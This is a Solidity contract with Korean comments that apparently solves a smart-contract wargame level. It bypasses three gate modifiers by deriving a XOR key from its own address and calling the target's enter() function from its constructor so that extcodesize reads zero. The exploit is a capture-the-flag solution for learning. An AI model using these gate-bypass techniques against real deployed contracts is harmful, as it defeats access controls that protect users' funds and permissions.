// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 동작 방식 정리
 * 1. gateOne 제한자: msg.sender와 tx.origin이 일치하지 않아야함 (= 실행 주체 CA)
 * 2. gateTwo 제한자: CA에서 함수 호출 시 extcodesize가 0이어야 함 (= 생성자에서 바로 호출하기, extcodesize가 정확히 무슨 의미인지 설명 필요)
 * 3. gateThree 제한자: gateKey와 msg.sender를 keccak256 연산한 해시값의 하위 8바이트와 xor 연산한 값이 uint64의 최대값이어야함.
 *
 * 목표
 * 제한자 모두 우회하고 enter 함수 실행하기
 *
 * 공격 방식
 * 1. gateKey를 [동작 방식 정리] 3번 항목의 조건에 맞게 CA 컨트랙트의 주소로 맞춰서 값 설정
 * 2. [동작 방식 정리] 2번 항목의 조건을 충족시키기 위해 enter 함수를 생성자에서 바로 호출
 */

contract Solve {
    bytes8 public gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
    bytes public encodedData = abi.encodeWithSignature("enter(bytes8)", gateKey);

    constructor(address _target) {
        (bool result, ) = _target.call(encodedData);
    }
}